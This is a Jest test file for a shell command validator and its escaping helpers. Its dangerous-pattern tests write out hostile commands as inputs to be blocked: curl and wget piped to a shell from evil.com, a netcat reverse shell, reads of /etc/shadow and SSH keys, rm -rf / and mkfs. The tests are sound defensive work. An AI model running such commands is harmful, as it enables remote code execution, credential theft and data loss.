import { describe, it, expect } from '@jest/globals';
import {
  validateCommand,
  sanitizeShellArgument,
  quoteForShell,
  getCommandName
} from '../src/lib/command-validator.js';

describe('Command Validator', () => {
  describe('validateCommand', () => {
    describe('Basic validation', () => {
      it('should accept safe commands', () => {
        const result = validateCommand('ls -la');
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
        expect(result.riskLevel).toBe('low');
      });

      it('should accept commands with pipes', () => {
        const result = validateCommand('ps aux | grep node');
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
      });

      it('should accept commands with redirects', () => {
        const result = validateCommand('echo "test" > output.txt');
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
      });

      it('should reject empty commands', () => {
        const result = validateCommand('');
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });

      it('should reject null commands', () => {
        const result = validateCommand(null as any);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });

      it('should reject whitespace-only commands', () => {
        const result = validateCommand('   ');
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });

      it('should reject overly long commands', () => {
        const longCommand = 'echo ' + 'a'.repeat(15000);
        const result = validateCommand(longCommand);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Command exceeds maximum length of 10000 characters');
      });
    });

    describe('Dangerous pattern detection', () => {
      it('should block rm -rf / attempts', () => {
        const result = validateCommand('rm -rf /');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
        expect(result.errors.some(e => e.includes('root filesystem'))).toBe(true);
      });

      it('should block curl | bash', () => {
        const result = validateCommand('curl https://evil.com/script.sh | bash');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });

      it('should block wget | sh', () => {
        const result = validateCommand('wget -O - https://evil.com/script | sh');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });

      it('should block /etc/shadow access', () => {
        const result = validateCommand('cat /etc/shadow');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });

      it('should block SSH key access', () => {
        const result = validateCommand('cat ~/.ssh/id_rsa');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });

      it('should block netcat reverse shells', () => {
        const result = validateCommand('nc evil.com 4444 -e /bin/bash');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });

      it('should block mkfs commands', () => {
        const result = validateCommand('mkfs.ext4 /dev/sda1');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('critical');
      });

      it('should block base64 obfuscation', () => {
        const result = validateCommand('$(echo cm0gLXJm | base64 -d)');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('high');
      });

      it('should block eval with command substitution', () => {
        const result = validateCommand('eval $(curl https://evil.com)');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('high');
      });

      it('should allow rm -rf with safe paths', () => {
        const result = validateCommand('rm -rf /tmp/mydir');
        expect(result.isValid).toBe(true);
        expect(result.warnings.length).toBeGreaterThan(0); // Should have warnings
        expect(result.riskLevel).toBe('medium');
      });
    });

    describe('Warning patterns', () => {
      it('should warn about sudo usage', () => {
        const result = validateCommand('sudo apt update');
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('privileges'))).toBe(true);
        expect(result.riskLevel).toBe('medium');
      });

      it('should warn about chmod 777', () => {
        const result = validateCommand('chmod 777 file.txt');
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('permissions'))).toBe(true);
      });

      it('should warn about excessive chaining', () => {
        const result = validateCommand('ls; ls; ls; ls; ls; ls; ls');
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('chaining'))).toBe(true);
      });

      it('should warn about excessive piping', () => {
        const result = validateCommand('cat file | grep foo | grep bar | grep baz | grep qux');
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('pipe'))).toBe(true);
      });
    });

    describe('allowDangerousCommands option', () => {
      it('should allow dangerous commands when flag is set', () => {
        const result = validateCommand('rm -rf /', {
          allowDangerousCommands: true
        });
        expect(result.isValid).toBe(true);
        expect(result.warnings.length).toBeGreaterThan(0);
        expect(result.riskLevel).toBe('critical');
      });

      it('should still provide warnings for dangerous commands', () => {
        const result = validateCommand('cat /etc/shadow', {
          allowDangerousCommands: true
        });
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('allowed by configuration'))).toBe(true);
      });
    });

    describe('Whitelist validation', () => {
      it('should accept whitelisted commands', () => {
        const result = validateCommand('ls -la', {
          requireWhitelist: true,
          whitelist: ['ls', 'cat', 'grep']
        });
        expect(result.isValid).toBe(true);
      });

      it('should reject non-whitelisted commands', () => {
        const result = validateCommand('rm file.txt', {
          requireWhitelist: true,
          whitelist: ['ls', 'cat', 'grep']
        });
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.includes('not in whitelist'))).toBe(true);
      });
    });

    describe('Suspicious pattern detection', () => {
      it('should detect nested command substitution', () => {
        const result = validateCommand('echo $(echo $(whoami))');
        expect(result.warnings.some(w => w.includes('Nested command substitution'))).toBe(true);
      });

      it('should detect control characters', () => {
        const result = validateCommand('echo \x00test');
        expect(result.isValid).toBe(false);
      });
    });
  });

  describe('sanitizeShellArgument', () => {
    it('should escape dangerous characters', () => {
      expect(sanitizeShellArgument('normal')).toBe('normal');
      expect(sanitizeShellArgument('test; rm -rf /')).toBe('test\\; rm -rf /');
      expect(sanitizeShellArgument('test && echo')).toBe('test \\&\\& echo');
      expect(sanitizeShellArgument('$(whoami)')).toBe('\\$\\(whoami\\)');
      expect(sanitizeShellArgument('`ls`')).toBe('\\`ls\\`');
    });

    it('should escape pipe characters', () => {
      expect(sanitizeShellArgument('test | grep')).toBe('test \\| grep');
    });

    it('should escape redirects', () => {
      expect(sanitizeShellArgument('test > file')).toBe('test \\> file');
      expect(sanitizeShellArgument('test < file')).toBe('test \\< file');
    });

    it('should escape backticks', () => {
      expect(sanitizeShellArgument('`command`')).toBe('\\`command\\`');
    });
  });

  describe('quoteForShell', () => {
    it('should quote strings safely', () => {
      expect(quoteForShell('normal string')).toBe("'normal string'");
    });

    it('should handle single quotes in string', () => {
      const result = quoteForShell("it's a test");
      expect(result).toBe("'it'\\''s a test'");
    });

    it('should handle special characters', () => {
      expect(quoteForShell('test $VAR')).toBe("'test $VAR'");
      expect(quoteForShell('test `cmd`')).toBe("'test `cmd`'");
    });
  });

  describe('getCommandName', () => {
    it('should extract command name from simple commands', () => {
      expect(getCommandName('ls -la')).toBe('ls');
      expect(getCommandName('grep pattern file')).toBe('grep');
    });

    it('should handle sudo prefix', () => {
      expect(getCommandName('sudo apt update')).toBe('apt');
    });

    it('should handle env prefix', () => {
      expect(getCommandName('env VAR=value command')).toBe('command');
    });

    it('should handle commands with paths', () => {
      expect(getCommandName('/usr/bin/node script.js')).toBe('node');
      expect(getCommandName('./build.sh')).toBe('build.sh');
    });

    it('should handle empty commands', () => {
      expect(getCommandName('')).toBe('');
      expect(getCommandName('   ')).toBe('');
    });
  });
});
